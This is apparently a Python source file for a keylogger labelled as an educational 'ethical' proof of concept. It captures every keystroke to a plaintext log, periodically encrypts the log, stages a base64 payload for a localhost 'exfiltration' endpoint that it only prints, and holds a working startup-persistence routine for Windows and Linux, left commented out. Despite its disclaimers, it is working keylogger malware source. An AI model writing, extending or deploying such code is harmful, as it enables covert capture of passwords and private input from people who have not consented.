import pynput
from pynput import keyboard
import json
import time
import os
import threading
from cryptography.fernet import Fernet
import base64
import requests
from datetime import datetime
import sys
import platform
import shutil

class EthicalKeylogger:
    def __init__(self):
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
        self.log_file = "keystrokes.log"
        self.encrypted_file = "encrypted_keystrokes.enc"
        self.config_file = "keylogger_config.json"
        self.kill_switch_file = "STOP_KEYLOGGER.txt"
        self.running = True
        self.keystrokes = []
        self.server_url = "http://localhost:8080/log"  # Simulated exfiltration
        self.setup_config()
        
    def setup_config(self):
        """Setup configuration file with ethical constraints"""
        config = {
            "purpose": "Educational Proof of Concept",
            "ethical_note": "This tool is for cybersecurity education only",
            "exfiltration": "Simulated to localhost only",
            "created": datetime.now().isoformat(),
            "encryption_key": base64.b64encode(self.key).decode()
        }
        with open(self.config_file, 'w') as f:
            json.dump(config, f, indent=4)
    
    def on_press(self, key):
        """Callback function for key press events"""
        if not self.running:
            return
            
        try:
            # Record the key
            keystroke_data = {
                "timestamp": datetime.now().isoformat(),
                "key": str(key),
                "type": "press"
            }
            self.keystrokes.append(keystroke_data)
            
            # Log to file
            with open(self.log_file, 'a') as f:
                f.write(f"{keystroke_data['timestamp']}: {keystroke_data['key']}\n")
                
        except Exception as e:
            print(f"Error logging keystroke: {e}")
    
    def on_release(self, key):
        """Callback function for key release events"""
        if key == keyboard.Key.esc:
            # ESC key to stop logging
            self.running = False
            return False
    
    def encrypt_logs(self):
        """Encrypt the collected keystrokes"""
        try:
            # Read the log file
            with open(self.log_file, 'rb') as f:
                log_data = f.read()
            
            # Encrypt the data
            encrypted_data = self.cipher.encrypt(log_data)
            
            # Save encrypted file
            with open(self.encrypted_file, 'wb') as f:
                f.write(encrypted_data)
            
            print("Logs encrypted successfully")
            return True
        except Exception as e:
            print(f"Error encrypting logs: {e}")
            return False
    
    def simulate_exfiltration(self):
        """Simulate sending encrypted data to remote server"""
        try:
            with open(self.encrypted_file, 'rb') as f:
                encrypted_data = f.read()
            
            # Simulate POST request to localhost
            payload = {
                "data": base64.b64encode(encrypted_data).decode(),
                "timestamp": datetime.now().isoformat(),
                "client_id": "ethical_demo"
            }
            
            # This would normally send to a real server
            # For demo, we'll just log the attempt
            print(f"Simulating exfiltration to: {self.server_url}")
            print(f"Data size: {len(encrypted_data)} bytes")
            
            # Save exfiltration log
            with open("exfiltration_log.json", 'a') as f:
                json.dump({
                    "timestamp": datetime.now().isoformat(),
                    "server": self.server_url,
                    "status": "simulated",
                    "data_size": len(encrypted_data)
                }, f)
                f.write("\n")
            
            return True
        except Exception as e:
            print(f"Error in exfiltration simulation: {e}")
            return False
    
    def add_startup_persistence(self):
        """Add keylogger to startup (ethical demonstration only)"""
        try:
            if platform.system() == "Windows":
                startup_folder = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
                script_path = os.path.abspath(__file__)
                shutil.copy2(script_path, os.path.join(startup_folder, "keylogger_demo.py"))
                print("Startup persistence added (Windows)")
            else:
                # For Linux/Mac - create a systemd service file (demo only)
                service_content = f"""[Unit]
Description=Ethical Keylogger Demo
After=network.target

[Service]
ExecStart=/usr/bin/python3 {os.path.abspath(__file__)}
Restart=always
User={os.getenv('USER')}

[Install]
WantedBy=multi-user.target
"""
                with open("keylogger_demo.service", 'w') as f:
                    f.write(service_content)
                print("Service file created (Linux/Mac) - for demo purposes only")
                
        except Exception as e:
            print(f"Error adding startup persistence: {e}")
    
    def check_kill_switch(self):
        """Check if kill switch file exists"""
        return os.path.exists(self.kill_switch_file)
    
    def run(self):
        """Main execution method"""
        print("Ethical Keylogger Started")
        print("Press ESC to stop logging")
        print(f"Create '{self.kill_switch_file}' to stop immediately")
        
        # Start keyboard listener
        with keyboard.Listener(
            on_press=self.on_press,
            on_release=self.on_release) as listener:
            
            # Periodic tasks thread
            def periodic_tasks():
                while self.running and not self.check_kill_switch():
                    time.sleep(30)  # Every 30 seconds
                    if self.running:
                        self.encrypt_logs()
                        self.simulate_exfiltration()
                
                if self.check_kill_switch():
                    print("Kill switch activated - stopping...")
                    self.running = False
                    listener.stop()
            
            task_thread = threading.Thread(target=periodic_tasks)
            task_thread.daemon = True
            task_thread.start()
            
            listener.join()
        
        # Final encryption and exfiltration
        self.encrypt_logs()
        self.simulate_exfiltration()
        print("Keylogger stopped")

if __name__ == "__main__":
    # Ethical warning
    print("=" * 50)
    print("ETHICAL KEYLOGGER - EDUCATIONAL PURPOSES ONLY")
    print("This tool is for cybersecurity education and research")
    print("Do not use for unauthorized monitoring")
    print("=" * 50)
    
    keylogger = EthicalKeylogger()
    
    # Optional: Add startup persistence (comment out for testing)
    # keylogger.add_startup_persistence()
    
    keylogger.run()